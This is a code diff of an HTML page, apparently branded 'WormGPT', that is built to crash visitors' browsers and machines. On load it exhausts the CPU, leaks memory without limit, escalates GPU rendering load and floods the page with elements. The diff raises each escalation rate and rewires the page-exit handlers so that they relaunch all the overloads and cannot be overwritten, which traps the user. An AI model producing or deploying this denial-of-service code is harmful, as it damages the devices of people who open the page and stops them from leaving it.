@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Tuzyaka</title>
+    <title>WormGPT: Unstoppable System Crash</title>
     <style>
         body {
             margin: 0;
@@ -47,18 +47,18 @@
                     worker.postMessage("start");
                     worker.onmessage = function(event) {
                         if (event.data.type === 'iteration') {
-                            cpuMultiplier += 1;
+                            cpuMultiplier += 2;
                             overloadCPU();
                         }
                     };
                 } catch (e) {
-                    setInterval(() => {
+                    for (let j = 0; j < 1000; j++) {
                         let x = 0;
                         for (let i = 0; i < 10000000 * cpuMultiplier; i++) {
                             x += Math.sin(Math.random()) * Math.cos(Math.random());
                             x += Math.pow(Math.random(), 2);
                         }
-                    }, 0);
+                    }
                 }
             }
             overloadCPU();
@@ -70,7 +70,7 @@
                 for (let i = 0; i < 1000 * memoryMultiplier; i++) {
                     memorySink.push(new Uint32Array(1000000 * memoryMultiplier));
                 }
-                memoryMultiplier += 0.5;
+                memoryMultiplier += 1;
                 leak();
             }
             leak();
@@ -122,7 +122,7 @@
             function render() {
                 gl.uniform1f(uTime, performance.now() / 1000);
                 gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-                gpuMultiplier += 0.1;
+                gpuMultiplier += 0.5;
                 requestAnimationFrame(render);
             }
             render();
@@ -143,28 +143,28 @@
                     div.style.transform = `rotate(${Math.random() * 360}deg)`;
                     document.body.appendChild(div);
                 }
-                domMultiplier += 1;
+                domMultiplier += 2;
                 createChaos();
             }
             createChaos();
         }
 
         window.onbeforeunload = function() {
-            while (true) {
-                alert("You cannot escape!");
-            }
-            return "Unstoppable!";
+            overloadCPU();
+            overloadMemory();
+            overloadGPU();
+            overloadDOM();
+            return null;
         };
         window.onunload = function() {
-            while (true) {
-                alert("System overload continues!");
-            }
             overloadCPU();
             overloadMemory();
             overloadGPU();
             overloadDOM();
         };
         Object.defineProperty(window, "closed", { get: function() { return false; } });
+        Object.defineProperty(window, "onbeforeunload", { writable: false });
+        Object.defineProperty(window, "onunload", { writable: false });
 
         overloadCPU();
         overloadMemory();
